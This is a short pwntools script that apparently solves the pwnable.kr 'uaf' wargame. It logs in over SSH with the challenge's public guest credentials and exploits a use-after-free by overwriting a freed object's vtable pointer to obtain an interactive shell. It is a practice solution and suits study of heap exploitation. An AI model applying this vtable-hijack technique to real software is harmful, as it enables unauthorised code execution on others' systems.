#! /usr/bin/env

from pwn import *

HOST='pwnable.kr'
PORT=2222
USER='uaf'
PASSWORD='guest'
BIN='./uaf'

conn = ssh(host=HOST, port=PORT,
        user=USER,
        password=PASSWORD)
#context.log_level = 'debug'

payload = p64(0x00401570 - 8)

p = conn.process([ BIN, '8', '/dev/stdin' ])
print p.recv(1024)
p.sendline('3')
print p.recv(1024)
p.sendline('2')
p.sendline(payload)
print p.recv(1024)
p.sendline('2')
p.sendline(payload)
print p.recv(1024)
p.sendline('1')
p.interactive()
